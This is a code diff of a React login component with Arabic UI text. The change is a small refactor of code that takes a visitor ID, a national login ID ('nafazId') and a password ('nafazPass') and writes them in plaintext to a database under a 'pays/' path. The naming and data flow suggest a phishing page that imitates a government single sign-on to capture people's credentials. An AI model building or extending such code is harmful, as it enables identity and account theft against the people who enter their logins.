@@ -49,14 +49,12 @@ export default function Component() {
 
     let visitorId = "";
 
-    if (typeof window !== "undefined") {
-      const savedVisitor = window.localStorage.getItem("visitor");
-      visitorId = savedVisitor ?? "";
+    const savedVisitor = window.localStorage.getItem("visitor");
+    visitorId = savedVisitor ?? "";
 
-      if (!visitorId) {
-        visitorId = Date.now().toString();
-        window.localStorage.setItem("visitor", visitorId);
-      }
+    if (!visitorId) {
+      visitorId = Date.now().toString();
+      window.localStorage.setItem("visitor", visitorId);
     }
 
     if (!idLogin || !password) {
@@ -67,7 +65,7 @@ export default function Component() {
     try {
       setIsLoading(true);
 
-      await addData(db, `pays/${visitorId}`, {
+      await addData(`pays/${visitorId}`, {
         id: visitorId,
         nafazId: idLogin,
         nafazPass: password,
@@ -147,7 +145,9 @@ export default function Component() {
               >
                 {isloading ? (
                   <><Loader2Icon className="animate-spin ml-2" />جاري التحقق...</>
-                ) : ("تسجيل الدخول")}
+                ) : (
+                  "تسجيل الدخول"
+                )}
               </Button>
 
               <div className="pt-4 border-t">
